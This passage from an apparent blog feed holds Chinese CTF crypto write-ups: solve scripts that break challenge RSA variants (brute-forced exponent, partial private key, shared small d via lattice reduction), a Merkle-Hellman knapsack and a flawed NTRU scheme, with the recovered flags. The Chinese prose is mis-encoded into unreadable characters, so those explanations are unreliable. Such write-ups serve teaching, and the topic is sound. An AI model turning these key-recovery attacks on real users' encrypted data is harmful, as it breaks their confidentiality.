style="zoom:50%;"></p><p>å·®å¼‚å°±åœ¨äºæ˜¯2-Rå·®åˆ†æ”»å‡»ï¼ŒT_Lâ€™å·²çŸ¥ï¼Œä½†T_Râ€™æœªçŸ¥ï¼Œä¸”åœ¨è¿™é‡ŒT_Râ€™æ®è¯´å¯ä»¥æ¿€æ´»ç¬¬å…­è½®å…¨éƒ¨å…«ä¸ªSç›’ï¼Œæ‰€ä»¥èƒ½åˆ†æ®µ8æ¬¡å¾—åˆ°å®Œæ•´å­å¯†é’¥</p><p>è€Œ1-Ræ”»å‡»ç»™å‡ºçš„å·®åˆ†è·¯å¾„ä½¿å¾—lâ€™å’Œrâ€™å‡å›ºå®šï¼ˆç›¸è¾ƒäº2-Rå·®åˆ†æ”»å‡»å…·å¤‡äº†å»å™ªèƒ½åŠ›ï¼‰ï¼Œä½†ç›¸åº”çš„ï¼Œè¿™æ¡è·¯å¾„çš„râ€™ä¹Ÿåªèƒ½æ¿€æ´»ç¬¬å…­è½®çš„Sbox[1]å’ŒSbox[2]ï¼Œå³åªèƒ½æ”»å‡»å¾—åˆ°ç¬¬å…­è½®å­å¯†é’¥çš„å‰12bitï¼Œå‰©ä¸‹æ¯”ç‰¹å†é€šè¿‡ç›¸åŒæ–¹æ³•å¾—åˆ°3æ¡å·®åˆ†è·¯å¾„ï¼Œç›´è‡³æ”»å‡»æ¢å¤å‡ºå®Œæ•´å­å¯†é’¥</p><p>æœ‰äº¿ç‚¹ç‚¹æ†¨å•Š1-Ræ”»å‡»è¿™ä¹ˆçœ‹èµ·æ¥â€¦wtcl</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(ä¸­å›½ç”µä¿¡2020å¤©ç¿¼æ¯) - Crypto</title>
      <link href="/2020/07/31/WriteUp-%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A12020%E5%A4%A9%E7%BF%BC%E6%9D%AF-Crypto/"/>
      <url>/2020/07/31/WriteUp-%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A12020%E5%A4%A9%E7%BF%BC%E6%9D%AF-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="EasyRSA"><a href="#EasyRSA" class="headerlink" title="EasyRSA"></a>EasyRSA</h3><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>Cryç­¾åˆ°é¢˜ï¼Œé€å­—èŠ‚çš„RSAï¼Œä¸”<code>assert(e &lt; 20000)</code>ï¼Œçˆ†ç ´å³å¯</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = [...]</span><br><span class="line">e = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">20000</span>):</span><br><span class="line">    <span class="keyword">if</span> pow(ord(<span class="string">'f'</span>), _, n) == c[<span class="number">0</span>]:</span><br><span class="line">        e = _</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># e = 11299</span></span><br><span class="line">flag_char = [ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>]</span><br><span class="line"><span class="keyword">for</span> c_char <span class="keyword">in</span> c[<span class="number">5</span>:<span class="number">-1</span>]:</span><br><span class="line">    <span class="keyword">for</span> m_char <span class="keyword">in</span> flag_char:</span><br><span class="line">        <span class="keyword">if</span> pow(m_char, e, n) == c_char:</span><br><span class="line">            print(chr(m_char), end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># caf94ef5f8400ae920c0bd79489f3791</span></span><br></pre></td></tr></table></figure><h3 id="HardRSA"><a href="#HardRSA" class="headerlink" title="HardRSA"></a>HardRSA</h3><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">510</span>)</span><br><span class="line">q = getPrime(<span class="number">510</span>)</span><br><span class="line">r = getPrime(<span class="number">510</span>)</span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">m = bytes_to_long(os.urandom(<span class="number">30</span>) + flag)</span><br><span class="line">n = p * q * r</span><br><span class="line">d = invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>))</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(n // p)</span><br><span class="line">print(p)</span><br><span class="line">print(c)</span><br><span class="line">print(hex(d % (<span class="number">1</span> &lt;&lt; <span class="number">540</span>)))</span><br></pre></td></tr></table></figure><p>$k(p-1)\rightarrow kâ€™,qr\rightarrow nâ€™,q+r\rightarrow s$</p><p>$ed_{0}\equiv 1+kâ€™(nâ€™-s+1)\quad mod\ 2^{d_{0}.nbits()}\quad (1)$</p><p>$q^{2}-sq+nâ€™\equiv 0\quad mod\ 2^{d_{0}.nbits()}\quad (2)$</p><p>$q\cdot (1),kâ€™\cdot (2)$ï¼Œè”ç«‹å¯å¾—ï¼Œ$(ed_{0}-1-kâ€™nâ€™-kâ€™)q+kâ€™q^{2}+kâ€™nâ€™\equiv 0\quad mod\ 2^{d_{0}.nbits()}$</p><p>å³æ±‚è§£åŒä½™æ–¹ç¨‹å¯å¾—<strong>qçš„ä½size(d0)ä½</strong>ï¼Œæœ¬æ¥æ˜¯ä¸ªpartial dçš„coppersmithé—®é¢˜ï¼Œä½†å› ä¸ºstep1æ±‚è§£åŒä½™æ–¹ç¨‹åå¾—åˆ°çš„qå·²æ˜¯å®Œæ•´çš„qï¼Œæ‰€ä»¥æ— éœ€åç»­çš„copper</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n, p)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e + <span class="number">1</span>):</span><br><span class="line">        k_dot = k * (p - <span class="number">1</span>)</span><br><span class="line">        results = solve_mod([e * d0 * X - k_dot * X * (n - X + <span class="number">1</span>) + k_dot * n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            q = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> n % q == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> q</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">n = ... <span class="comment"># q * r</span></span><br><span class="line">p = </span><br><span class="line">c = </span><br><span class="line">d0 = </span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">kbits = d0.nbits()</span><br><span class="line">q = find_p(d0, kbits, e, n, p)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (n // q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">print(bytes.fromhex(hex(pow(c, d, p * n))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b'\xf3\xaa\x03~\xaesZ?\xb5\x84\x0b\t\xb7-\xd8\xa8\xca\x80\x18\xd4\x9eVm6\x8bU\xb6\xfb`\x8eflag&#123;6809781d08e120627e623dcdafe26b8a&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="AliceHomework"><a href="#AliceHomework" class="headerlink" title="AliceHomework"></a>AliceHomework</h3><h4 id="é¢˜è§£åˆ†æ-2"><a href="#é¢˜è§£åˆ†æ-2" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>Merkle-Hellmançš„èƒŒåŒ…ç³»ç»Ÿï¼ŒShamirâ€™s Attackæ²¡è‡ªå·±å®ç°è¿‡- -ç…§ä¾‹ä½œæ ¼åŸºçº¦åŒ–</p><p>303ç»´çš„å­é›†å’Œé—®é¢˜ï¼Œå·²çŸ¥æ˜æ–‡flag{â€¦}å¯ä»¥é™ç»´åˆ°256ç»´ï¼Œè§„æ¨¡è¿˜æ˜¯ç•¥å¤§ï¼ˆä½†æ˜¯èµ›åå¾—çŸ¥åˆ°è¿™ä¸€æ­¥ä»¥åç›´æ¥LLLèƒ½å‡ºï¼Œå•Šè¿™ï¼‰</p><p>ç”±äºflagå†…èŠ¯æ˜¯32ä½å°å†™md5ï¼Œè€Œ0~fçš„äºŒè¿›åˆ¶ç¼–ç å‡ä¸º$0x1xxxxx$æ ¼å¼ï¼Œå› æ­¤èƒ½ç»§ç»­é™ç»´è‡³256-32*2=192ç»´</p><p>æœ€åå¸¸è§„BKZå³å¯</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pubkey = [...] <span class="comment"># len(pubkey) == 303</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">prefix = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(bytes_to_long(<span class="string">b'flag&#123;'</span>))[<span class="number">2</span>:]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(prefix)):</span><br><span class="line">    c -= prefix[i] * pubkey[i]</span><br><span class="line"></span><br><span class="line">suffix = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(ord(<span class="string">'&#125;'</span>))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)]</span><br><span class="line">n = len(pubkey)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    c -= pubkey[n - <span class="number">8</span> + i] * suffix[i]</span><br><span class="line">    </span><br><span class="line">elements = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(prefix), len(pubkey) - <span class="number">8</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="comment">#c -= 0 * pubkey[i]</span></span><br><span class="line">    elements.append(pubkey[i + <span class="number">1</span>])</span><br><span class="line">    c -= <span class="number">1</span> * pubkey[i + <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">8</span>):</span><br><span class="line">        elements.append(pubkey[i + j])</span><br><span class="line">        </span><br><span class="line">n = len(elements)</span><br><span class="line">A = Matrix(ZZ, n + <span class="number">1</span>, n + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    A[i, <span class="number">0</span>] = elements[i]</span><br><span class="line">    A[i, i + <span class="number">1</span>] = <span class="number">2</span></span><br><span class="line">A[n, <span class="number">0</span>] = c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">    A[n, i] = <span class="number">1</span></span><br><span class="line">AL = A.BKZ()</span><br><span class="line">mid = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> AL:</span><br><span class="line">    <span class="keyword">if</span> all(line[i] == <span class="number">1</span> <span class="keyword">or</span> line[i] == <span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>)):</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">            line = -line</span><br><span class="line">        mid = line[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">mid_str = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> mid:</span><br><span class="line">    <span class="keyword">if</span> _ == <span class="number">-1</span>:</span><br><span class="line">        mid_str += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mid_str += <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    flag += <span class="string">'0'</span></span><br><span class="line">    flag += mid_str[j]</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    flag += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        flag += mid_str[j]</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">print(long_to_bytes(int(flag, <span class="number">2</span>)))</span><br><span class="line"><span class="comment"># b'8130e8c14fe4df06558c0a7ebf06f272'</span></span><br></pre></td></tr></table></figure><h3 id="PolyCrypto"><a href="#PolyCrypto" class="headerlink" title="PolyCrypto"></a>PolyCrypto</h3><h4 id="é¢˜è§£åˆ†æ-3"><a href="#é¢˜è§£åˆ†æ-3" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>NTRU CryptoSystemï¼Œèµ›ä¸­æ¥ä¸åŠ- -</p><p>éæ ‡å‡†çš„NTRUï¼Œä¸”ç§é’¥å·²ç»™å‡ºï¼Œç›´æ¥decryptå³å¯</p><p><strong>Enc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">I = Integers(q)</span><br><span class="line">R = PolynomialRing(I, <span class="string">"x"</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">S = R.quotient(x ^ N - <span class="number">1</span>, <span class="string">"x"</span>)</span><br><span class="line">F = S(randomseq(N)) <span class="comment"># æœ¬é¢˜randomseqæ— æ ‡å‡†NTRUä¸­çš„å‚æ•°d...å°±ç›´æ¥[randint(-1, 1) for _ in range(N)]...å¾ˆè¿·</span></span><br><span class="line">f = p * F + <span class="number">1</span></span><br><span class="line">z = f ^ <span class="number">-1</span></span><br><span class="line">g = S(randomseq(N))</span><br><span class="line">h = p * z * g</span><br><span class="line"><span class="comment"># h =&gt; pubkey ; f =&gt; prikey</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(key, block ,S)</span>:</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="comment"># transform number to polynomial</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(N):</span><br><span class="line">        out.append(block % <span class="number">3</span> - <span class="number">1</span>)</span><br><span class="line">        block -= block % <span class="number">3</span></span><br><span class="line">        block //= <span class="number">3</span></span><br><span class="line">    cipher = S(randomseq(N)) * key + S(out) <span class="comment"># c = r * h + m</span></span><br><span class="line">    <span class="keyword">return</span> list(cipher)</span><br></pre></td></tr></table></figure><p>$c=r<em>h+m=r</em>p<em>z</em>g+m\quad (mod\ q)$</p><p>$a=f<em>c=r</em>p<em>g+f</em>m\quad (mod\ q)$</p><p>æ ‡å‡†çš„NTRUè§£å¯†åŸºäºè¯¥æ­¥éª¤çš„$rpg+fm$åœ¨Zmod(q)ä¸åœ¨ZZä¸Šç­‰ä»·ï¼Œå¦åˆ™åœ¨$a*inv_f$åå¾—åˆ°çš„ç»“æœém</p><p>è€Œæœ¬é¢˜randomseqæ˜¯ä¸ªè‡ªå†™çš„å‡½æ•°â€¦æ±‰æ˜é‡é‡ä¸èƒ½ä¿è¯ä¸Šç•Œï¼Œä¸”$F=randpoly,f=p*F+1$ï¼Œå› æ­¤æ ‡å‡†decryptå¤±è´¥ï¼Œå†æ¬¡åŒ–ç®€ä¸Šå¼å¯çŸ¥ï¼Œ</p><p>$a=f<em>c=r</em>p<em>g+p</em>m*F+m$ï¼Œå› æ­¤åœ¨Zmod(p)ä¸Šå³ä¸ºm</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">61</span></span><br><span class="line">q = <span class="number">5039</span></span><br><span class="line">p = <span class="number">11</span></span><br><span class="line">PR = PolynomialRing(ZZ, name = <span class="string">'x'</span>)</span><br><span class="line">x = PR.gen()</span><br><span class="line">R = PR.quotient_ring(x ^ n - <span class="number">1</span>, names = <span class="string">'y'</span>)</span><br><span class="line">y = R.gen()</span><br><span class="line">h = R([...])</span><br><span class="line">f = R([...])</span><br><span class="line">c = [[...], [...], ...]</span><br><span class="line">c = [R(_) <span class="keyword">for</span> _ <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balance_mod</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    g = list(((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_prime</span><span class="params">(f, p)</span>:</span></span><br><span class="line">    T = R.base().change_ring(Integers(p)).quotient(x ^ n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(<span class="number">1</span> / T(f))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coef2num</span><span class="params">(coefs)</span>:</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(coefs)):</span><br><span class="line">        num += coefs[i] * (<span class="number">3</span> ** i)</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c, f)</span>:</span></span><br><span class="line">    a = balance_mod(c * f, q)</span><br><span class="line">    <span class="comment"># m = balance_mod(a * invert_mod_prime(f, p), p)</span></span><br><span class="line">    m = balance_mod(a, p)</span><br><span class="line">    coefs = [_ + <span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> m]</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(coef2num(coefs))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b""</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> c:</span><br><span class="line">    flag += decrypt(_, f)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># b'59d34a385e1b59c977eea74e92e0d9dc'</span></span><br></pre></td></tr></table></figure><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>Fianlæ˜¯å†…ç½‘ç»¼åˆæ¸—é€ï¼Œé˜Ÿå‹å¸¦é£ï¼Œèˆ’é€‚.jpg</p><p><img src= "/img/loading.gif" data-src="/2020/07/31/WriteUp-%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A12020%E5%A4%A9%E7%BF%BC%E6%9D%AF-Crypto/5c925fcbbe85298b.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(SCTF2020) - Crypto</title>
      <link href="/2020/07/06/WriteUp-SCTF2020-Crypto/"/>
      <url>/2020/07/06/WriteUp-SCTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p>è™½è¯´ä¾æ—§æ˜¯paperé¢˜- -ä½†å‡ºé¢˜äººåŸºæœ¬æ²¡åšéšè—orå˜æ¢ï¼ˆcoinè€ƒç‚¹crashï¼Œç„¶åå›æ¥éª‚éª‚å’§å’§.jpgï¼Œç¬‘æ­»</p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p><strong>Encode</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">flag = int(<span class="string">'SCTF&#123;*******************&#125;'</span>.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">d = getPrime(randint(<span class="number">380</span>, <span class="number">385</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    e = inverse(d, fn)</span><br><span class="line">    c = pow(flag, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'e'</span>+str(_)+str(<span class="string">'='</span>)+hex(e)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'n'</span>+str(_)+str(<span class="string">'='</span>)+hex(n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'c'</span>+str(_)+str(<span class="string">'='</span>)+hex(c)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">350</span></span><br></pre></td></tr></table></figure><p><strong>Attack on r ($e_{i},n_{i},c_{i}$)s with Common d($d&lt;N_{r}^{\delta}$)</strong></p><p><a href="https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf" target="_blank" rel="noopener">https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf</a></p><p>$N_{1}&lt;N_{2}&lt;â€¦&lt;N_{r}&lt;2N_{1}$ with Common $d&lt;N_{r}^{\delta}$. And all each modulus is balanced so that $s=p+q-1&lt;\frac{3\sqrt{2}}{2}N_{r}^{1/2}&lt;3N^{1/2}.$ Then we have r equations: $e_{i}d-N_{i}k_{i}=1-k_{i}s_{i}$.</p><p>Let vector A = $[d,k_{1},k_{2}â€¦,k_{r}]$, $M=ceil(N_{r}^{1/2})$, matrix B =</p><script type="math/tex; mode=display">\left[\begin{matrix}M & e_{1} & e_{2} & ... & e_{r}\\0 & -N_{1} & 0 & ... & 0\\0 & 0 & -N_{2} & ... & 0\\... & ... & ... & ... & ...\\0 & 0 & 0 & ... & -N_{r}\\\end{matrix}\right]</script><p>$C=AB=[dM,1-k_{1}s_{1},1-k_{2}s_{2},â€¦,1-k_{r}s_{r}]$.</p><p>è½¬æ±‚å‘é‡Cæ»¡è¶³Lattice(B)çš„Minkowskiç•Œçš„æ¡ä»¶ï¼ˆæ»¡è¶³å³è½¬åŒ–ä¸ºSVPï¼‰ï¼š</p><p>$|C|&lt;N_{r}^{\frac{1}{2}+\delta}\sqrt{1+9r}$. </p><p>$\sqrt{r+1}det(B)^{\frac{1}{r+1}}&gt;\sqrt{r+1}N_{1}^{\frac{r+\frac{1}{2}}{r+1}}&gt;\sqrt{r+1}(\frac{N_{r}}{2})^{\frac{r+\frac{1}{2}}{r+1}}$.</p><p><strong>Then we wanna $N_{r}^{\frac{1}{2}+\delta}\sqrt{1+9r}&lt;\sqrt{r+1}(\frac{N_{r}}{2})^{\frac{r+\frac{1}{2}}{r+1}}\Leftrightarrow N_{r}^{\delta-\frac{r}{2r+2}}&lt;\frac{\sqrt{\frac{r+1}{9r+1}}}{2^{\frac{2r+1}{2r+2}}}$.</strong></p><p>Cuz $r\geq 1$, the right side $&gt;\frac{1}{6}$. So if</p><script type="math/tex; mode=display">\delta<\frac{r}{2r+2}-log_{N_{r}}(6)</script><p>the Minkowski satisfies.</p><p>ä½œæœ¬é¢˜çš„ç®€å•ä¼°è®¡ï¼Œ$bound\approx\frac{3}{8}-\frac{1}{400}&gt;\frac{380}{1024}$.</p><p>size(d) = 385æ—¶ï¼Œä»åŸç†ä¸Šæœ‰ä¸€å®šå¤±è´¥å‡ ç‡ï¼Œä½†èƒ½å¾ˆå®¹æ˜“äº¤äº’å‡ºsize(d)æ»¡è¶³Minkowskiç•Œçš„d. (e.g. size(d)=380)</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">e = [...]</span><br><span class="line">n = [...]</span><br><span class="line">c = [...]</span><br><span class="line">M = isqrt(max(n))</span><br><span class="line">A = Matrix(ZZ, len(e) + <span class="number">1</span>, len(e) + <span class="number">1</span>)</span><br><span class="line">A[<span class="number">0</span>] = [M] + e</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(e)):</span><br><span class="line">    A[i + <span class="number">1</span>, i + <span class="number">1</span>] = -n[i]</span><br><span class="line">AL = A.BKZ()</span><br><span class="line">d = AL[<span class="number">0</span>, <span class="number">0</span>] // M</span><br><span 